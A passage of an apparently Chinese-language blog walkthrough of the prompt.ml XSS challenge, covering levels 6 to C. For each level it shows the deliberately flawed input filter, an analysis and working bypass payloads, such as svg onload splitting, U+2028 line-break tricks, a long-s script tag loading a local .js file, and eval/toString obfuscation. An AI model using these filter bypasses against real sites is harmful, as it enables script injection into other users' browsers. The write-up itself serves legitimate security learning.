class=\"keyword\">n</span>\\</span><br><span class=\"line\">            document.write(<span class=\"string\">\"Action forbidden.\"</span>)               \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">    &lt;/script&gt;                                                 \\<span class=\"keyword\">n</span>\\</span><br><span class=\"line\">        ';</span><br><span class=\"line\">    &#125; catch (<span class=\"keyword\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> 'Invalid <span class=\"keyword\">form</span> data.';</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以http:<span class=\"comment\">//httpbin.org/post#&#123;\"name\":\"Matt\"&#125;为例</span></span><br><span class=\"line\">用#分成两部分http:<span class=\"comment\">//httpbin.org/post和&#123;\"name\":\"Matt\"&#125;</span></span><br><span class=\"line\">将http:<span class=\"comment\">//httpbin.org/post放入表单的action</span></span><br><span class=\"line\">&#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"Matt\"</span>&#125;的<span class=\"keyword\">name</span>放入input的<span class=\"keyword\">name</span>属性,value=Matt</span><br><span class=\"line\">如下：</span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"http://httpbin.org/post\"</span> method=<span class=\"string\">\"post\"</span>&gt;&lt;input <span class=\"keyword\">name</span>=<span class=\"string\">\"name\"</span> value=<span class=\"string\">\"Matt\"</span>&gt;&lt;/form&gt;</span><br><span class=\"line\">之后检查http:<span class=\"comment\">//httpbin.org/post中是否有script:或者data:</span></span><br><span class=\"line\">检查到就报错,没有就提交,目的是禁止使用类似下面的javascript，vbscript和<span class=\"keyword\">data</span></span><br><span class=\"line\">javascript:alert(<span class=\"number\">1</span>)<span class=\"comment\">//</span></span><br><span class=\"line\">vbscript:alert(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">data</span>:<span class=\"keyword\">text</span>/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><br></pre></td></tr></table></figure>\n\n<p>这一课比较抽象,看下答案<code>javascript:prompt(1)#{&quot;action&quot;:1}</code>后做了下实验,通过将input中的name属性设action,能将</p>\n<p>form表单中的action替换成input的。因为input的action为[object HTMLInputElement],所以</p>\n<p>if (!/script:|data:/i.test(document.forms[0].action))就匹配不到,返回False后经过！为真,成功绕过。</p>\n<p><img src=\"/img/xss/prompt_ml/level6_001.png\" alt=\"6_1\"></p>\n<p><img src=\"/img/xss/prompt_ml/level6_002.png\" alt=\"6_2\"></p>\n<h2 id=\"Solutions-6\"><a href=\"#Solutions-6\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"selector-class\">.javascript</span>:prompt(<span class=\"number\">1</span>)#&#123;<span class=\"string\">\"action\"</span>:<span class=\"number\">1</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-6\"><a href=\"#Img-6\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>javascript:prompt(1)#{&quot;action&quot;:1}</code><br> <img src=\"/img/xss/prompt_ml/level6_003.png\" alt=\"6_3\"></li>\n</ol>\n<h1 id=\"Level-7\"><a href=\"#Level-7\" class=\"headerlink\" title=\"Level 7\"></a>Level 7</h1><h2 id=\"Code-7\"><a href=\"#Code-7\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// pass in something like dog#cat#bird#mouse...</span></span><br><span class=\"line\">    var segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> segments.map(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(title)</span> &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// title can only contain 12 characters</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;p class=\"</span>comment<span class=\"string\">\" title=\"</span><span class=\"string\">' + title.slice(0, 12) + '</span><span class=\"string\">\"&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;).join(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>通过split将字符串分割成数组,再通过数组的map方法能创建新的数组,新数组格式加工成了</p>\n<p><code>&lt;p class=&quot;comment&quot; title=&quot;最长只有12字符的内容&quot;&gt;&lt;/p&gt;</code></p>\n<p>slice(0,12):取前12个字符。</p>\n<p>来张图体会一下</p>\n<p><img src=\"/img/xss/prompt_ml/level7_001.png\" alt=\"7_1\"></p>\n<p>能修改的内容就是tittle处了,#来分割的新数组。</p>\n<p>可以利用多行注释来打通,注意到一段只有12个字符,要简洁。</p>\n<p>考虑到最短要使用到<code>&lt;svg/onload=prompt(1)</code>的变形。</p>\n<h2 id=\"Solutions-7\"><a href=\"#Solutions-7\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><ol>\n<li><p><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code><br>官方答案短一个字符…<br><code>&quot;&gt;&lt;svg/a=#&quot;onload=&#39;/*#*/prompt(1)&#39;</code></p>\n</li>\n<li><p>利用eval函数特性执行拼接内容<br><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>\n</li>\n<li><p>利用换行</p>\n</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\"><span class=\"comment\">/*#*/</span>prompt(<span class=\"comment\">/*#*/</span><span class=\"number\">1</span>)<span class=\"comment\">/*#*/</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<h2 id=\"Img-7\"><a href=\"#Img-7\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;svg/a=&#39;#&#39;onload=&#39;/*#*/prompt(1)&#39;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_002.png\" alt=\"7_2\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_003.png\" alt=\"7_3\"></p>\n<ol start=\"3\">\n<li>1234是为了换行</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\"><span class=\"comment\">/*#*/</span>prompt(<span class=\"comment\">/*#*/</span><span class=\"number\">1</span>)<span class=\"comment\">/*#*/</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/level7_004.png\" alt=\"7_4\"></p>\n<ol start=\"4\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level7_005.png\" alt=\"7_5\"></p>\n<h1 id=\"Level-8\"><a href=\"#Level-8\" class=\"headerlink\" title=\"Level 8\"></a>Level 8</h1><h2 id=\"Code-8\"><a href=\"#Code-8\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// prevent input from getting out of comment</span></span><br><span class=\"line\">    <span class=\"comment\">// strip off line-breaks and stuff</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/[\\r\\n&lt;/\"]/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'                                \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;                                    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        // console.log(\"'</span> + input + <span class=\"string\">'\");        \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt; '</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-8\"><a href=\"#分析-8\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了换行 &lt; /,解决这题需要绕过换行。</span><br><span class=\"line\">官方给的答案是：</span><br><span class=\"line\">[U+<span class=\"number\">2028</span>]prompt(<span class=\"number\">1</span>)[U+<span class=\"number\">2028</span>]<span class=\"function\">--&gt;</span></span><br><span class=\"line\">这里很多人的都没成功，我在firefox下也没成功,不过chrome是可以的。</span><br><span class=\"line\">prompt<span class=\"function\"><span class=\"params\">(<span class=\"number\">1</span>)</span>--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>[U+2028]特殊字符在这复制：<a href=\"https://unicode-table.com/en/#2028\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/#2028</a></p>\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n<p><img src=\"/img/xss/prompt_ml/level8_001.png\" alt=\"8_1\"></p>\n<h2 id=\"Solutions-8\"><a href=\"#Solutions-8\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><p>仅对chrome有用,firefox不行</p>\n<html><b>&#8232;prompt(1)&#8232;&#x2d;&#x2d;></b></html>\n\n<h2 id=\"Img-8\"><a href=\"#Img-8\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><img src=\"/img/xss/prompt_ml/level8_002.png\" alt=\"8_2\"></li>\n</ol>\n<h1 id=\"Level-9\"><a href=\"#Level-9\" class=\"headerlink\" title=\"Level 9\"></a>Level 9</h1><h2 id=\"Code-9\"><a href=\"#Code-9\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // filter potential start-tags</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/&lt;([a-zA-Z])/g, <span class=\"string\">'&lt;_$1'</span>);</span><br><span class=\"line\">    // use all-caps <span class=\"keyword\">for</span> heading</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase();</span><br><span class=\"line\"></span><br><span class=\"line\">    // sample <span class=\"built_in\">input</span>: you shall <span class=\"keyword\">not</span> pass! =&gt; YOU SHALL NOT PASS!</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;h1&gt;'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'&lt;/h1&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-9\"><a href=\"#分析-9\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight excel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将&lt;XXX 替换成&lt;_XXX (XXX表示任意字符)</span><br><span class=\"line\">然后把小写转换成大写。</span><br><span class=\"line\">可以引用外部文件,利用js的scrpit,src和域名的大小写不敏感绕过。再利用toUpperCase()的特性，它不仅转换英文字母，也转换一些<span class=\"built_in\">Unicode</span>字符，比如将ſ传入就可以转换为S。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-9\"><a href=\"#Solutions-9\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ſcript</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://192.168.75.132/pro.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">这是我本地phpstudy下的pro.js文件,内容只有prompt(1)。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-9\"><a href=\"#Img-9\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p><img src=\"/img/xss/prompt_ml/level9_001.png\" alt=\"9_1\"></p>\n<ol>\n<li><code>&lt;ſcript src=&quot;http://192.168.75.132/pro.js&quot;&gt;&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/level9_002.png\" alt=\"9_2\"></p>\n<h1 id=\"Level-A\"><a href=\"#Level-A\" class=\"headerlink\" title=\"Level A\"></a>Level A</h1><h2 id=\"Code-10\"><a href=\"#Code-10\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// (╯°□°）╯︵ ┻━┻</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// (╯°□°）╯︵ /(.□. \\）DONT FLIP ME BRO</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-10\"><a href=\"#分析-10\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 <span class=\"keyword\">ASCII</span> 字母和数字进行编码，也不会对这些 <span class=\"keyword\">ASCII</span> 标点符号进行编码： - _ . ! ~ * ' ( ) 。</span><br><span class=\"line\">而接下来又将‘消除,传如promp't</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-10\"><a href=\"#Solutions-10\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> </span><br><span class=\"line\">promp't(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-10\"><a href=\"#Img-10\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>promp&#39;t(1)</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelA_001.png\" alt=\"A_1\"></p>\n<h1 id=\"Level-B\"><a href=\"#Level-B\" class=\"headerlink\" title=\"Level B\"></a>Level B</h1><h2 id=\"Code-11\"><a href=\"#Code-11\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// name should not contain special characters</span></span><br><span class=\"line\">    var memberName = input.replace(/[[|\\s+*/\\\\&lt;&gt;&amp;^:;=~!%-]/g, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// data to be parsed as JSON</span></span><br><span class=\"line\">    var dataString = <span class=\"string\">'&#123;\"</span>action<span class=\"string\">\":\"</span>login<span class=\"string\">\",\"</span>message<span class=\"string\">\":\"</span>Welcome back, <span class=\"string\">' + memberName + '</span>.<span class=\"string\">\"&#125;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// directly \"parse\" data in script context</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'                                \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;                                    \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        var data = '</span> + dataString + <span class=\"string\">';          \\n\\</span></span><br><span class=\"line\"><span class=\"string\">        if (data.action === \"</span>login<span class=\"string\">\")            \\n\\</span></span><br><span class=\"line\"><span class=\"string\">            document.write(data.message)        \\n\\</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-11\"><a href=\"#分析-11\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将以下符号消除</span><br><span class=\"line\">[ | 空白符 + * \\ &lt; &gt; &amp; ^ : ; = ~ ! <span class=\"comment\">% -</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-11\"><a href=\"#Solutions-11\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>. 测试时发现<span class=\"keyword\">json对象的名称相同时会取最右的值,但是这里过滤了：,有什么办法绕过呢。</span></span><br><span class=\"line\"><span class=\"keyword\">官方答案是:\"(prompt(1))in\"</span></span><br><span class=\"line\"><span class=\"keyword\">in是js的关系操作符</span></span><br><span class=\"line\"><span class=\"keyword\">这个会发生js错误，但是能执行prompt(1)</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">同样答案也可是：\"(prompt(1))instanceof\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelB_001.png\" alt=\"B_1\"></p>\n<h2 id=\"Img-11\"><a href=\"#Img-11\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><p><code>&quot;(prompt(1))in&quot;</code></p>\n<p><img src=\"/img/xss/prompt_ml/levelB_002.png\" alt=\"B_2\"></p>\n</li>\n<li><p><code>&quot;(prompt(1))instanceof&quot;</code></p>\n<p><img src=\"/img/xss/prompt_ml/levelB_003.png\" alt=\"B_3\"></p>\n</li>\n</ol>\n<h1 id=\"Level-C\"><a href=\"#Level-C\" class=\"headerlink\" title=\"Level C\"></a>Level C</h1><h2 id=\"Code-12\"><a href=\"#Code-12\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// in Soviet Russia...</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// table flips you!</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ノ┬─┬ノ ︵ ( \\o°o)\\</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-12\"><a href=\"#分析-12\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。该方法不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - <span class=\"symbol\">_</span> . ! ~ * ' ( ) 。</span><br><span class=\"line\"></span><br><span class=\"line\">这里只能利用编码了</span><br><span class=\"line\">参考答案利用parseInt(字符串,基数)函数将字符串转换成整数,用指定基数表示。</span><br><span class=\"line\">parseInt(<span class=\"string\">\"prompt\"</span>,<span class=\"number\">36</span>); //<span class=\"number\">1558153217</span></span><br><span class=\"line\">然后又用toString转化回来,用<span class=\"built_in\">concat</span>函数拼接编码的(<span class=\"number\">1</span>)</span><br><span class=\"line\">参考答案:</span><br><span class=\"line\"><span class=\"built_in\">eval</span>((<span class=\"number\">1558153217</span>).toString(<span class=\"number\">36</span>).<span class=\"built_in\">concat</span>(String.fromCharCode(<span class=\"number\">40</span>)).<span class=\"built_in\">concat</span>(<span class=\"number\">1</span>).<span class=\"built_in\">concat</span>(String.fromCharCode(<span class=\"number\">41</span>)))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Solutions-12\"><a href=\"#Solutions-12\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>eval((<span class=\"number\">1558153217</span>).toString(<span class=\"number\">36</span>).concat(String.fromCharCode(<span class=\"number\">40</span>)).concat(<span class=\"number\">1</span>).concat(String.fromCharCode(<span class=\"number\">41</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span> 参考答案的简化版,因为没有对(<span class=\"number\">1</span>)过滤</span><br><span class=\"line\">eval((<span class=\"number\">630038579</span>).toString(<span class=\"number\">30</span>))(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-12\"><a href=\"#Img-12\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelC_001.png\" alt=\"C_1\"></p>\n<ol start=\"2\">\n<li><code>eval((630038579).toString(30))(1)</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelC_002.png\" alt=\"C_2\"></p>\n<h1 id=\"Level-D\"><a href=\"#Level-D\" class=\"headerlink\" title=\"Level D\"></a>Level D</h1><h2 id=\"Code-13\"><a href=\"#Code-13\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// extend method from Underscore library</span></span><br><span class=\"line\">    <span class=\"comment\">// _.extend(destination, *sources) </span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">extend</span>(<span class=\"params\">obj</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> source, prop;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">1</span>, length = <span class=\"built_in\">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class=\"line\">            source = <span class=\"built_in\">arguments</span>[i];</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (prop <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\">                obj[prop] = source[prop];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// a simple picture plugin</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pass in something like 